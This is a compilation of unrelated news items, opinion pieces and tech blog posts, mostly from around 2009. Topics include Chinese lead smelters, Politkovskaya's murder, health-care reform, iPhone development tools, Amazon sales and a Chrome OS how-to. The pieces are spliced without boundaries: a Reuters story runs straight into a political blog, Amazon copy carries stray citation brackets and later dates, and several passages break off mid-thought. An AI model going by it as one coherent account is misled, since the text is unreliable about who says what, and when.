It looks as though Peter Molyneux is not very fond of demos , and goes so far as to call the game trials “ the death knell of experiences ” .
Instead , he proposes that the first bit of the game be released instead .
“ I hate demos .
I think demos are the death knell of experiences , ” he told Edge .
“ Over the years I ’ve done demos and they ’ve either completely ruined the game , given too much to the player , or they ’ve confused people , so I said that we should give away the very first 45 minutes of the game , completely free . ”
Good to hear , Pete .

Xizhou ( the name means “ happy town ” ) is a sleepy - looking place with an impressive history , on the shores of Erhai Lake , 12 miles north of the larger and better - known city of Dali .
To get there , you either fly nonstop from Beijing , Shanghai , or Hong Kong to Lijiang and then drive two or three hours , or you fly to Kunming , stay overnight , and fly to Dali the next day ( the flights are morning - only , so you ca n’t make the trip in one day ) .
There are normal Chinese hotels in the vicinity , but most Westerners will prefer the Linden Centre , at about $ 100 a night .
Through the long era of trade in tea and horses between this part of China and Tibet and Burma , Xizhou was an enclave for prosperous merchants , officials , and scholars .
The people of the region are mainly from the Bai ethnic group ;
Bai cities have a distinct architectural style , with sharply arched roofs and richly decorated tile work and wall paintings .
During World War II , the Yale - in - China campus ended up in Xizhou , for safety from the oncoming Japanese .
When Flying Tigers aviators flew supplies from Burma to Chiang Kai - shek ’s nationalists in Chungking ( now Chongqing ) , American radio and radar operators in Xizhou were one of their first points of contact after they made it over the Himalayan hump .
The crumbly radar complex is still there — the Lindens hope to make it a museum — and so are Yale ’s old Bai - style buildings .
All around those structures and the courtyard compound the Lindens have bought is an expanse of paddy land that stretches to Erhai Lake on one side and to the Himalayan foothills on the other .
In arid northern and western China , to depend on the land for sustenance is to be poor .
In Xizhou the soil is so rich , the rain so steady , and the climate so mild that the valley has a sense of rural abundance like that of the American Midwest .
In poor farm villages of the drylands , children wear rubber flip - flops or often - repaired hand - me - down shoes .
The shoes we saw on children ’s feet in Xizhou looked stylish and new .
In Xizhou , the Lindens worked with party officials to secure something rarely accorded foreigners : the right to use a “ Class A ” historical relic and restore it — its tiling , wooden arches and fretwork , painted murals .
The buildings survived the 1960s because a People ’s Liberation Army detachment had encamped there , keeping out the Red Guards .
The Lindens have invested their savings in the faith that the rest of the town will be restored in similar taste — as local officials assure them — making the Linden Centre and Xizhou an internationally appealing cultural destination .
This is a big assumption in today ’s China , where the population is rich enough to travel domestically in huge numbers but where the aesthetic of travel is unrefined by Western standards .
People travel in big groups , on big buses , behind guides with flags , to a prescribed list of “ famous ” sites .
Across China , “ ancient ” villages are being redeveloped in a kitschy , gift - shop - heavy way epitomized by Lijiang , 100 miles north of Xizhou , a favorite stop of many Chinese tour groups and a disappointment to most Westerners .
On my first visit to Xizhou , Brian Linden assured me that the local officials had all “ learned from Lijiang ” and were planning to do something “ really authentic and classy . ”
On my second visit , I wandered into a real - estate showroom complete with models of a new housing estate to be built in “ Ancient Xizhou . ” I hope the Lindens have bet right .

Nudity has been a staple of the visual arts since time began , but apparently the real thing is still too much for some people to handle .
On Wednesday , a 26 - year - old model was arrested in New York after posing for a photo shoot at the Metropolitan Museum of Art. Police said Kathleen Neill was posing naked for a photographer in full view of visitors at a gallery in the museum 's arms and armor department .
Neill has been charged with two crimes : endangering the welfare of a minor and public lewdness , according to her lawyer , Donald Schechter .
She was released from police custody Wednesday and is scheduled to appear in court on Sept. 22 .
" She did n't do anything sexual .
She did n't perform lewdly and she made no reference to her genitalia , " Schechter said in an interview with Culture Monster .
" There are nude sculptures and paintings all over the museum .
It 's the height of stupidity accusing a live model of showing the same thing in a house of art . "
The photo shoot was conducted by Brooklyn - based photographer Zach Hyman for an upcoming art show .
( Hyman has not been charged with any crimes so far . )
" It 's a project I 've been working on for three months now -- it 's the idea that nudity is n't necessarily perverse or sexual , " he said in a phone interview today .
Hyman did n't have formal permission to photograph in the museum but he said that " people take personal pictures there all the time . "
A museum employee who was passing through the gallery stopped the photo shoot and escorted the pair to the front of the building to wait for police .
When asked for a comment , the museum issued the following statement : " As a nonprofit institution on city - owned land , the Met , like all other individual and institutional citizens , is subject to municipal laws , rules , and regulations . "
Hyman 's photography exhibition is planned to open Sept. 3 at the Chair and the Maiden Gallery in Manhattan .

ON THE very day the Productivity Commission released its controversial report on executive salaries , BrisConnections has revealed it paid substantial bonuses to a management team that presided over one of the most disastrous floats in Australian corporate history .
Managing director Ray Wilson was paid a $ 240,000 cash bonus on July 31 this year , on top of his $ 398,713 salary .
Including superannuation and his bonus , Wilson received $ 669,722 last financial year for working just seven months .
Most of BrisConnections ' key management staff received substantial bonuses last financial year , even though the company 's share price plummeted to just 0.1 ¢ per listed unit - the floor price a stock can trade at on the Australian Securities Exchange .
Chief financial officer Nicholas Lattimore received a cash bonus of $ 140,000 , equivalent to 32 per cent of his base remuneration .
He pocketed $ 456,727 in total last financial year .
( PhysOrg.com ) --
Doctors and lawyers are more likely to come from wealthy backgrounds according to new research from the Department of Economics that indicates that the ‘ social gap ’ that prevents poorer people from entering the top professions is becoming more pronounced over time .
Using data on family income and IQ in childhood drawn from the National Child Development Survey ( NCDS ) , which tracks a representative sample of the population born in 1958 , and the British Cohort Study ( BCS ) , which follows people born in 1970 , the research shows that professions such as law and medicine attract better - off people , compared with other professions such as teaching and nursing , although differences in IQ test scores for the former decreased over time .
On the other hand , those who became engineers and nurses - two professions with the lowest average family incomes across the groups and the lowest IQ scores for those born in 1958 - appear to buck this trend with the average IQ scores for both professions increasing over time .
Taking the occupation of all individuals in the NCDS and BCS who were in a profession in their early 30s and calculating the average monthly income of their families when they were 16 years old , the report shows that individuals from both groups who went on to become doctors and lawyers came from families with much higher incomes than the average .
Scientists , dentists or vets , however came from families with a much lower income than those of future doctors .
Doctors who were born in 1958 came from families with incomes 42 per cent greater than the average compared with only 7 per cent more for scientists and other medical professions .
For those born in 1970 , this had increased to 63 per cent and 16 per cent respectively .
Those born in 1958 who went on to become accountants came from families with average incomes no different from the average but those born in 1970 who went on to become accountants came from families earning 40 per cent more a month than the average family .
Similarly , those born in 1958 who went on to become journalists came from families with below average incomes but , for those born in 1970 , this difference had increased to over £ 600 a month above the average salary .
Out of all of the professions , lecturing , teaching and art are the only professions that exhibit a small decrease in the family income between the 1958 group and the 1970 group .
In the case of teachers , this may be due to the rewards offered in the past decade to attempt to increase the number of teachers in the labour market , including help with training costs and bursaries for living expenses while in training .
Out of journalists , bankers and accountants , who had the largest increases in family incomes compared with the average across the two cohorts , journalists fared marginally better in IQ scores over time but not to the extent the income difference suggests , while bankers and accountants saw their IQ scores decrease compared with the average .
This effect was particularly pronounced for accountants .
This seems to suggest that while differences in incomes were rising for the top professions , differences in ability were declining , so that those entering some professions were increasingly from better - off families despite the fact that their ability was closer to but still above the average .
These patterns are repeated when using maths and reading test scores instead of IQ .
More significantly , this trend appears to have worsened in many of the professions for those born in 1970 compared with those born in 1958 , with the gaps in family income between the top professions and the average increasing over time .
Speaking about the findings , the report ’s author Lindsey MacMillan said :
‘ The findings suggest that there is a widening social gap in entry in entry to the top professions .
Some of these are increasingly being filled by individuals who look less different to the average in terms of ability but more different to the average in terms of family income . ’

There may be a glimmer of hope in the sordid story of what passes for a justice system in Vladimir Putin ’s Russia .
Last Thursday , the Russian Supreme Court ordered prosecutors to begin a new investigation into the death of Anna Politkovskaya , the investigative journalist and sharp critic of the Kremlin , who was shot in 2006 .
The court canceled the retrial of four men accused  and acquitted  of involvement in the murder , and sided with the reporter ’s family .
It makes little sense to waste more time and attention on suspects who were clearly peripheral to the case .
We hope the prosecutors will now focus on finding the real killers of this brave journalist , no matter where the trail may lead .
Three years later , shockingly little is known about this crime .
Ms. Politkovskaya , 48 , documented torture , mass executions and kidnappings as she covered the brutal war in Chechnya .
There is no question whom she held responsible for the carnage : the Russian Army and Mr. Putin .
On the day she was killed with four shots from a silenced pistol , she was about to deliver a major report to her newspaper on torture in Chechnya .
Few countries are less safe for journalists than Russia .
Since Mr. Putin ( now prime minister ) came to power in 2000 , some 17 have been killed , and most of the murders are unsolved .
It is not hard to imagine what a chilling effect that must have on journalism .
I would love to let dingalings like Kirk Cameron live and let live , but he and folks like him do not extend the same courtesy to me .

FENGXIAN , China ( Reuters ) - Chinese provinces have begun shutting lead smelters for environmental checks , after hundreds of children tested for high levels of lead in two separate cases this month .
Residents walk past a zinc smelter belonging to the Dongling Group , in Fengxian county , Shaanxi province , August 22 , 2009 .
A lead smelter belonging to the same group was closed this month after nearby children were found with high levels of lead in their blood , a problem that is endemic in communities near smelters across China .
REUTERS / Lucy Hornby
At least three lead smelters in Henan province and two in Shaanxi province , with a combined capacity of about 6 percent of China ’s annual production , were ordered to temporarily halt operations in recent days , officials said .
The closures came after parents protested at a lead and zinc smelter operated by Dongling Group in Changqing , Shaanxi Province , and at a manganese smelter in Hunan this month .
China ’s pollution and lax product safety standards have long been a source of tension and unrest , particularly when residents of pollution hotspots -- dubbed “ cancer villages ” because of high disease rates -- feel they are being ignored .
Lead poisoning is endemic among villages near Chinese smelters , interviews conducted this weekend showed .
In Shaanxi ’s Fengxian , where smoke billows from a Dongling Group zinc smelter , two wan and listless toddlers tested with high levels of lead in their blood earlier this year .
Villagers requested but did not get testing for 30 other children .
“ These problems are really common actually .
It ’s just that the Dongling case in Changqing got some attention , ” said a villager surnamed Tu . Older villagers developed circulatory problems and some workers at the plant got too sick to work .
“ This environmental pollution is not unique to Fengxian .
It ’s all over . ”
Lead poisoning due to air and water pollution from poorly regulated smelters and mines haunts the valleys of the ore - rich Qinling range , in a poor and remote part of China .
The problem dogs heavy metals bases in Hunan , Henan , Yunnan and Guangdong provinces .
Closing polluting plants has pushed the industry to poorer areas where any investment is welcome .
The shift to poorer regions echoes the migration of the lead smelting industry to China over the last decade , as stricter environmental laws forced smelters in richer countries to close .
China ’s output of refined lead rose nearly 20 percent in 2008 to 3.26 million metric tons .
Output feeds the Chinese battery industry , the world ’s largest , which then exports worldwide .
CONTAMINATED
The casualties of China ’s heavy metals industry only get attention when officials respond to cases too large to ignore .
In late 2005 , two of China ’s largest zinc smelters shut temporarily after cadmium contaminated the Pearl River Delta and the Xiang River , sources of drinking water for millions in Hunan and Guangdong Provinces .
Cadmium hurts kidney and lung function .
Elevated cadmium levels also showed up in tests of children near the Dongling Group ’s lead and zinc smelter in Changqing .
Children are most vulnerable to lead poisoning because they are still developing , but smelter workers also fall sick because they absorb it through their skin .
Ingestion of large amounts of lead may result in anemia , muscle weakness and brain damage .
“ My dad could n’t stand it any more , so he quit working .
It got so he could only work 20 days at a time , then he would have to stop , ” said a young woman surnamed Zhang .
“ Dad ’s tummy would always hurt .
When it ’s bad , he does n’t want to eat and has no energy . ”
Zhang ’s husband now works at a different smelter after her family ’s employer , Shaanxi Nonferrous Metals Holding , halted work at its 50,000 ton Wenjiangsi lead smelter earlier this month .
Workers at the Wenjiangsi plant said the plant ’s internal clinic regularly treats workers who get to the point that they cannot work .
They resume work when they feel better .
“ It ’s not a problem if you drink a lot of alcohol , ” said a young man in a blue work uniform .
Ever since Obama swore the oath of office , I have followed the political discourse in America very closely .
I paid particular attention to how America now deals with the issue of race .
I saw the premature declarations that America was now entering a ‘ post - partisan ’ era as…well , interesting .
I personally feel that Obama is a very talented politician , maybe the most gifted of my generation .
The way he handled the Rev Wright controversy with a nuisance speech on how race still affects American life and his denouncement of his mentor / friend / father figure Rev Wright was the closest I have seen a politician play career roulette and win .
The situation taught me three things about Barack Obama ; 1 - He is not to be underestimated , 2 - He is absolutely ruthless , and 3 - He is a tactician .
These are the three things that the G.O.P fails to acknowledge about Obama .
Their new short term strategy of throwing the kitchen sink at the president may show some short term gains in the polls , but long term Obama still holds all the cards .
The American economy seems to be showing signs of vitality and if Obama manages to pass health care , politically the Republicans will be left in ruins .
This is why they can not afford to pitch any capital on the race game they seem to be playing with Obama , because he too knows the rules of the game very well .
Obama baited the Republicans with the nomination of Sonia Sotomayor , calculating that the G.O.P would not show enough political sensitivity and alienate what is soon to be a major voting block in the United States .
Calling Sotomayor a racist , an affirmative action pick and focusing solely on her ‘ wise Latina ’ comment validated Obama ’s political move .
The Republicans might think that they have nothing to lose by attacking Sotomayor but I believe all they have done is provide ammunition to the Democrats to delegitimize the G.O.P in the Latino community in future campaigns .
There has to be someone in the Republican ranks that is able to look at the bigger picture and calculate that the small gains they are making attacking Sotomayor are not worth it .
Even if enough Republicans vote for her in her confirmation , I believe that the damage has already been done .
This new Birther phenomenon also plays a part in delegitimizing the Republicans in a voting block they already struggle with , ethnic minorities .
How this movement has any support in the mainstream Republican ranks is beyond me .
I think it symbolizes the desperate situation the G.O.P find themselves in .
Off course the issue of de-legitimacy when it comes to the American presidency has been prominent in political discussion in both Clinton and Bush ’s terms , but the reasons have n’t been as laughable or as nonsensical as claiming Obama was n’t born in America .
This Birther phenomenon is beneath the Republicans and it should be shut down as soon as possible .
Again , there has to be someone in the Republican ranks who can see that it is doing their party more bad than good .
There will become a time where people associate this nutty movement solely with the Republican Party , thus driving away ethnic minorities ( who will soon become a majority in America ) moderate republicans and independents alike .
When Obama has decided to speak about the issue of Race , he apparently managed to alienate white voters .
What many failed to acknowledge was that he spoke what many consider to be a universal truth amongst ethnic minorities on the issue of how police treat non-white suspects .
I believe that the Gates - Gate did improve Obama ’s position amongst black voters ( if that was ever more possible ) .
My overall conclusion is that Republicans really need to stay away from the issue of race .
Stay far away from it .
Do not drink ( how do you Americans say ? ) the Kool - Aid and think that race damages Obama , it damages the Republicans as well , if not more .
The Republicans need to regroup and refocus on the issues like fiscal responsibility , personal freedoms and a strong national defense , issues which they can actually make real and sustainable gains on .
Race is not one of those issues .
I am a huge fan of Lee Atwater ’s genius ‘ Southern Strategy ’ but the political climate has changed .
Obama is playing the race game and Republicans : it will kill you .

The South Korea government was still reeling Wednesday after former U.S. President Bill Clinton 's surprise visit to North Korea .
A senior government official said , " The worst - case scenario for us would be to see the repetition of the nightmare of 1994 . "
At the time , the South Korean government was completely left out in the cold as the U.S. and North Korea concluded the Geneva Agreed Framework in the wake of former U.S. President Jimmy Carter 's visit to Pyongyang .
Under the deal , South Korea had to bear most of the construction costs for a light - water reactor that was to be traded for the North 's closure of its plutonium - producing nuclear plant in Yongbyon .
" It 's important for us to maintain close cooperation with the U.S. to prevent us from being left out in the cold as in 1994 , " the official added .
But a Unification Ministry official said a repeat of that disaster is unlikely .
" At the moment , North Korea is excited with memories of 1994 , but it seems most likely that Clinton 's visit was a kind of one - point relief pitch aimed at winning the release of the American journalists .
We need to watch how Washington and Pyongyang will go ahead with their dialogue , " he said .
His rationale was that Carter visited Pyongyang in 1994 expressly to find a solution to the nuclear issue , while Clinton visited to seek the release of the two U.S. reporters who had been sentenced to hard labor for illegally entering the country .
Especially , the government is concerned about the possibility of the critical public opinion seething over Seoul failing to seek the release of a South Korean man detained at the Kaesong Industrial Complex .
A Cheong Wa Dae official claimed there had been a " sharing of views " between South Korea and the U.S. over humanitarian issues such as the female journalists under detention and the South Korean man held incommunicado at Kaesong before Clinton went to Pyongyang .
" I believe there 'll also be progress in the issue of the South Korean man under detention , " he said .
So far , however , North Korea has said nothing about the man , identified as Yoo , who has been held incommunicado for 129 days , and the crew of a South Korean fishing boat 800 Yeonan towed to the North on July 30 .
In a press briefing , the ministry said , " The government is watching closely how the release of the female journalists will affect the issues of the South Korean staffer at Kaesong or the Yeonan .
It 's still too early to judge what kind of effect their release will have on these issues . "
An historic World war one flag that was stolen from the RSL's Sydney headquarters 11 days ago has been returned .
The flag was found this morning in the reception area of the building , wrapped in brown paper .
The banner of the ninth battalion was carried ashore by Australian troops at Gallipoli in 1915 .
It went missing while it was in temporary storage during the renovation of the RSL's headquarters , and was returned anonymously this morning .
New South Wales RSL President Don Rowe says he is relieved that the banner has been returned , undamaged .
" One of the things that helped was that there was so much media coverage that you would n't have been able to display it , " he said .
" You could n't have sold it .
You could n't have done anything with it .
I 'm extremely pleased to see that it has been returned back to its rightful place here at Anzac house
Opinion
Let 's declare war on terror over health care
In the continuing absence of universal access to health care in the U.S. , terror abounds .
The terror of being uninsured if you become ill , the terror of personal bankruptcy due to health care costs , the terror of pre-existing conditions that prevent obtaining health insurance — all have led to a state of fear in this country .
Having reconsidered the previous administration 's “ war on terror ” that led to so much abuse of power and loss of domestic freedoms and so little success in the Middle East , we should now commence a national effort to combat this real form of terror in our own country .
Many have made the case in the past that national security is health care security .
Recently , Rep. Charles B. Rangel , D - N.Y. , and others have come to this realization , as well .
We cannot field an army without a healthy populace .
Our economy cannot support our wars unless we have a healthy work force .
In the case of the Pentagon , we do not question the national imperative to maintain our security .
We entrust an enormous portion of our taxes to this single , “ government - run ” agency to defend our country , and we are all proud and grateful for the heroic job that our young men and women do .
However , let us suppose that we applied the same criticisms to our national defense that some do to any effort to establish a national health security plan , through health care reform .
Would we say that the government should not run the defense , that anything our government does is doomed to failure ?
Would we be better off leaving our national military security in the hands of a private , free market , where you buy what you can afford ?
Would we say to poor neighborhoods and states that , since they cannot afford the same quality of defense that wealthier neighborhoods can , that they can not be equally defended ?
Would we encourage the wealthiest neighborhoods to buy the best in private armies that Blackwater might have for sale ?
I hope not .
Let us agree , however , that the national security is integrally related to national health security .
With more than 45 million of us uninsured and many millions more underinsured , let us agree that it is imperative for the U.S. to defend itself against this terror .
Some say that we now have the best health care system in the world .
Sadly , this is simply not true .
While we can provide extraordinary care to those who can pay , so many Americans have no meaningful access .
As a nation , our health care is , in fact , poor .
OECD data show that the U.S. spends more per capita on health care than any other Westernized nation .
Yet , we have the worst population - wide outcomes of the same group of countries .
In heart disease , cancer , infant mortality and other areas , we are last among our peers in outcomes as a nation .
How can this be ?
In the health care business , as it has evolved in the U.S. , the economic incentives for providers are aligned to reward the performance of as many procedures as possible on people who can pay , through varying levels of insurance or their own wealth .
Performing as many procedures as possible , necessary or not , certainly does not reliably lead to better public health .
Often , expensive procedures performed without scientific rationale increase risks to patients , not to mention costs .
Outcomes are worse ; costs are higher , just because the funds are provided through perverse economic incentives .
President Obama is exactly right that reduction in costs is essential and primary to any successful reform of health care .
It is ludicrously false economics simply to take the number of uninsured people and multiply that number by the costs of what our system currently spends on average .
This false calculation leads , inevitably , to the frightening cost and deficit estimates that those who oppose real reform use as scare tactics .
Real reform begins with changing economic incentives to reward good medical decisions , based upon widely available scientific evidence .
We have to pay for good decisions , not for the maximum number of procedures .
With good decisions and fewer procedures will come the lower costs that we must achieve .
Paying for good decisions will also result in better outcomes , along with the lower costs .
Finally , we can begin to pay providers for those better outcomes , as we recognize and measure them .
The public option is absolutely essential to a successful war on health care terror .
Only with a publicly supervised option can we ascertain that every American has access to care .
Also , through the public scrutiny of such a system , we can be certain to reward good choices and good outcomes .
The insurance companies complain , through their political allies and expensive advertisements , of unfair competition .
One might imagine a private security firm complaining that the Defense Department has analogous unfair advantages in its business .
However , if a government –sponsored health program should prove to be as undesirable and ineffective as the naysayers suggest , then we should expect the private insurance companies to do very well indeed .
As patriotic Americans , let us support the president in his effort to bring health care access to all Americans .
This “ war ” requires courage and determination .
To paraphrase U - 2 , we “ have to believe it to see it . ”
Let us believe in the importance to our nation of access to health .

We need to do a BIG push for the Rockefeller public option amendment this week !
It 's known as the Rockefeller Amendment 187 , which establishes a public option that is similar to the House version in the Ways and Means and the Education and Labor Committee .
We also need to PUSH BACK against the Snowe trigger amendment , known as the Snowe Amendment 356 , which would put a trigger called a " safety net " on the public option .
I just love how they try to come up with new words for the trigger on the public option .
When you CALL the Senate Finance Committee Democrats and Senator Snowe below , please let them know what amendments you support and which ones you 're against .

On my previous few days of diving into iPhone development , found some promising environments for the iphone development .
1. unity ( http://unity3d.com/unity/features/iphone-publishing )
This is an IDE , for 3d Graphical Object authoring which has compelling capabilities regarding the content creation .
Pros :
With in - built events handlers ( behaviours ) and native iphone support looks very promising as far as the content creation and delivery are concerned .
Full light , shadow and materials in a 3d environment is just a full fledged game development environment .
The IDE can be used in both Windows and MAC .
Cons :
A very high price tag .
2. torque2d ( http://www.garagegames.com/products/torque-2d/iphone )
This is an IDE for 2D Graphical Object authoring .
WYSIWYG 2D editor at iPhone screen resolution .
Has got a 3d IDE ( http://www.garagegames.com/products/tge/iphone) for iphone .
Pros :
Makes a complete game development environment as the Objects are visual and a custom scripting environment for the obejcts , same kind as Unity but 2D environment .
Option to divide the 2D and 3D games as per requirement .
This IDE can be used in both Windows and Mac .
Cons :
Still a high price tag and not a clear Licensing model .
3. ston3d ( http://www.stonetrip.com/shiva/publish-3d-game-on-iphone.html )
This is an IDE ( http://www.stonetrip.com/) for 3D authoring as Unity and Torque .
Pros :
Makes a complete game development environment as the Objects are visual and a custom scripting environment for the obejcts , same kind as Unity and Torque .
Runs on both Windows and Mac .
Cons :
Still a high price tag ( http://www.stonetrip.com/platform/view-all-products.html)
the iphone exporter only works in Mac .
The IDEs are too good for a complete game development environment , where the developers and designers work in the same IDE .
Graphics can be done and kept as library items and then developers can take those to add the desired behaviour .
This will be much like developing the Flash IDE with actionscript .
But then all of the people invloved in the development must have teh clear knowledge of the environment and the developers must learn the new languages specific to the IDEs .
4. nui ( http://libnui.net/pages/about.php )
A C++ framework designed to build multiplatform applications on top 3D rendered dynamic layouts .
Pros : platforms supported are iPhone , MacOSX , Win32 , Linux
Cons :
High price tag , only coding and no graphics IDE will increase the complexity of development .
5. HAXE ( http://ncannasse.fr/blog/haxe_for_iphone)
A language to create projects in multiple platforms .
Pros :
An actionscript like language , with which flash developers can get upto speed very fast .
Publish the application in different environment ( Haxe publishes to SWF , Javascript , PHP and C++ now )
Complete Opensource development .
Cons :
The present support for iPhone is a JailBreak one .
6. PyObjC ( http://pyobjc.sourceforge.net/)
A python language derivative to create ObjecticveC applications
Pros : Can use Python knowledge to develop .
Opensource development .
Cons :
Does not make any sense for a flash developer , anyway has to study a new language .
At ( http://www.saurik.com/id/5) it says one still need to know ObjectiveC .
7. alcheMo-for- iPhone ( http://innaworks.com/alcheMo-for-iPhone.html)
pros :
Use java to develop iphone applications .
Seems its the only one which does not require Jailbreak or any other tweeks to develop for iPhone in Java .
cons : Neither Download norLicensing are clear .
8. QuickConnect ( http://quickconnect.sourceforge.net/browser/index.html)
A javascript framework to develop iphone apps .
pros : will be easy and fast develoopement as it is in javascript .
Multiple platform deployment .
Since it is open source and liberally licenced you can use it to develop for your open source , free projects or closed source , for - cost projects .
cons : still a Release candidate . ( http://sourceforge.net/projects/quickconnect/)
9. XMLVM ( http://www.xmlvm.org/iphone/)
An XML driven iphone application development .
pros :
Simple and fast as its all XML .
Opensource .
cons : Needs Jail - break ( http://plum.sfsu.edu/xml11-external/java4iphone-google.pdf , page 28 )
10 . The Cocotron ( http://www.cocotron.org/)
This is an open source project which aims to implement a cross-platform Objective - C API similar to that described by Apple Inc. ’s Cocoa documentation .
pros :
Cross platform developement , so can be developed on windows .
cons : Need to learn ObjectiveC .
Still seems premature .
While all of the programming environments either seem under heavy development or missing tutorials , its a good idea to keep an eye on them as all of them seem promising .
Same with the graphical IDEs .
Would like to see HAXE coming up as my personal favorite from a flash developers point of view . :)

OpenShot Video Editor has not released an " official " version yet and is still under development .
But that does n't mean you can't install it .
If you are interested in installing OpenShot ( and do n't mind a few bugs ) , download the Extract to a folder named ~/ openshot_wizard / Open a terminal window $ cd ~/openshot_wizard / $ python install .
pyFollow the on-screen instructions ... and that 's it !
The Build Wizard should install an icon on your desktop , and an icon in your Applications >

I love microframeworks and I love Python to it therefore follows that I love the minimal web frameworks you can get for Python like CherryPy .
However as soon as I heard about Juno , a clone of my favourite microframework Sinatra I had to give it a go .
For me the archetypal application for Sinatra is Git -Wiki and therefore to kick the tires on Juno I decided to try and do the same thing with Bazaar .
Hence : Bzr -Wiki on Juno !
You need Juno , Jinja2 and SQLAlchemy as well the source from Launchpad .
Once you have it all then got to the repo directory and type bzr init .
You should then be good to fire up wiki .py and muck around with it .
It is slightly ugly and lacks access to revision history , diffs and user tracking but apart from that it is a surprisingly functional wiki .
It is also bi-directional in that you can add files to the Bazaar repo and they get reflected in the app .
So what was Juno like to work with ?
Well overall I thought this was the best Python microframework I have used so far .
I really like the idea of decorating methods to avoid having to generate a mapping table .
The syntax is terse and comprehensible , the conventions around the framework made sense to me .
By comparison with its progenitor I think I really missed the autoloading / dynamic evaluation that allows you to change code in Sinatra and have it immediately take effect .
The function of the Request decorator was initially quite obscure ( it binds all HTTP verbs to that method , if you want to map GET to another method you must specify all verbs independently ) and I am still not sure it is right .
I think the most specific decorator should take precedence .
Other than that I think the framework ports a lot of the concepts from Sinatra in a sympathetic way .
The dependency on SQL Alchemy is also really clunky .
If you specify that you are not using a database ( as is the case here ) then it is annoying to have to download a dependency and makes installation on Windows a pain I did n’t even want to try and tackle .
Juno is really promising though and I look forward to it developing .
I think it would be a real delight to use it in an environment like Google App Engine .
During Amazon's Cyber Monday Deals
Week , you 'll find the best deals on popular holiday products and gift items for a whole week , not just one day .
Amazon is known for its incredible selection of merchandise , and for an entire week you can find deals in every category .
Get free Amazon gift cards with select orders .
To stay on top of the sales , download the Amazon mobile app , sign up for emails , like Amazon on Facebook and follow @amazondeals on Twitter .
The domain amazon.com attracted at least 615 million visitors annually by 2008 . [ 119 ]
Amazon attracts over 130 million customers to its US website per month by the start of 2016 . [ 120 ]
The company has also invested heavily on a massive amount of server capacity for its website , especially to handle the excessive traffic during the December Christmas holiday season . [ 121 ]
But one of the biggest differences between Cyber Monday and Black Friday remains : the style of shopping , says Vice President of PR and Events at Slickdeals , Regina Conway .
“ For example , we see more sitewide discounts or category - wide discounts on Cyber Monday , whereas Black Friday will often have very specific products such as electronics and home goods at deep , deep discounts , ” she says .
“ However , more merchants have started advertising specific product deals on Cyber Monday and vice versa , so the holidays are starting to have more crossover . ”
You already know you can save big on Amazon Prime Day 2018 , but with these Amazon shopping hacks you can save even more .
When you shop through RetailMeNot , you get $ 10 ​​​​ ​cash back on orders of $ 100 ( or more ) on Amazon .
Another excellent way to save every day , not just Prime Day ?

Shelfari was a social cataloging website for books .
Shelfari users built virtual bookshelves of the titles which they owned or had read and they could rate , review , tag and discuss their books .
Users could also create groups that other members could join , create discussions and talk about books , or other topics .
Recommendations could be sent to friends on the site for what books to read .
Amazon bought the company in August 2008 . [ 100 ]
Shelfari continued to function as an independent book social network within the Amazon until January 2016 , when Amazon announced that it would be merging Shelfari with Goodreads and closing down Shelfari . [ 102 ] [ 103 ]
Although the company did raise the minimum wage for all of its employees earlier this month , it ’s plowing ahead on warehouse robotics and automation in a way that could fundamentally reshape how its lowest - paid employees perform work — and how many of those employees it needs to retain .
Amazon now uses more than 100,000 robots in warehouses around the world to help move and organize products , according to The New York Times , and it also sponsors an annual robotics competition to help spur innovation in AI that could result in more dexterous and intelligent robots capable of performing complex physical tasks .
Nail your timing .
While it can be valuable to be one of the first in line for limited - quantity products , if you ’re going to shop online on Black Friday , timing may not actually matter all that much .
According to data from deal - finding browser extension Honey , online purchases spike well after sunrise .
“ On Black Friday , spending peaked at 11 a.m. PST in Los Angeles and at 12 p.m. EST in New York City , ” says Kelly Parisi , Vice President of Communications at Honey .

In addition to strict acceptance to be sold by As Seen On TV Incorporated , Telebrands and other distributers , the most successful products have almost always served to provide a solution to a common problem - and this has inspired inventors worldwide to share their creations and push the industry .
The industry leaders have always been smart when it comes to marketing , and have recently started making more of a transition towards ecommerce – using micro websites to push their products , and making good use of affiliate programs .
Infomercials now support awareness in addition to creating it .
Like on Black Friday , for online Cyber Monday shoppers , there ’s no need to wake before the rooster crows .
Honey ’s Parsi says that for their users , spending peaked at 4 p.m. PST in Los Angeles and 11 p.m. EST in New York City last year .
“ On Cyber Monday , there is less pressure to get an early start because retailers are often better stocked online , where they store items in large warehouses — not on shop shelves with limited space — and can ship items from different locations to make up for shortfalls , ” Palmer agrees .
“ Plus , many Cyber Monday sales actually start on Sunday . ” Twitch started in 2007 as a 24 - hour live stream of co-founder Justin Kan ’s life ( he coined the term “ lifecasting ” ) called Justin.tv , but it became very clear very quickly that live gaming content was more popular than pretty much anything else .
In 2011 , Twitch spun off gaming - centric channels as Twitch.tv , and it grew exponentially as online games and the technology to broadcast them live on the internet became more widespread and popular .

Nobody knows exactly what Google 's forthcoming Chrome OS will look or act like , but we 've got a pretty good idea of what they 're going for .
Here 's how to live out Google 's online - only OS vision , right now
Advertisement
Before we dive in , it 's worth talking about exactly what we 're going for here .
What " theory of Chrome " are we planning to adhere to ?
Or perhaps more to the point , what the hell is Chrome ?
From Google :
" Google Chrome OS is an open source , lightweight operating system that will initially be targeted at netbooks " and " most of the user experience takes place on the web . "
That is , it 's " Google Chrome running within a new windowing system on top of a Linux kernel " with the web as the platform .
It runs on x86 processors ( like your standard Core 2 Duo ) and ARM processors ( like inside every mobile smartphone ) .
Underneath lies security architecture that 's completely redesigned to be virus - resistant and easy to update .
Advertisement
From our own Matt Buchanan :
If I had to guess , I 'd say Chrome OS is somewhere in between an entirely browser - based OS and a generic Linux distro , though leaning toward the former .
In other words , Chrome , as we understand it , and as Google describes it , is a Linux OS that lives on the web , depending almost entirely on Google 's suite of services , which are served through a special , Google - designed interface .
We have no way of knowing what this mysterious window manager , menu system or desktop environment will look like , so we can't replicate that .
The web half of Chrome OS , though , is already in place , and ready for us to clumsily unify .
So , we 'll make our own stripped - down operating system .
Here 's how :
Get Yourself Some Linux
Before embarking on this goofy afternoon software project , we need a launchpad .
Specifically : Linux .
You could go with almost any distro and accomplish the same effect , but this guide will be focused on a distribution called Xubuntu .
Why Xubuntu ?
Because it strike a perfect balance between being extremely compatible and easy to install — on both counts , it really is — and , since it 's essentially just a version of the uber - popular Ubuntu Linux distro with a stripped - down , super - fast desktop environment called XFCE , it 's quick , and lightweight .
Anyway , head over the the Xubuntu website and start downloading .
( Go with 9.04 the latest stable version . )
Advertisement
There are a few ways to handle this .
If you 're planning to install Xubuntu on a netbook — Chrome 's first and most natural target — you 're probably going to need to create a bootable flash drive .
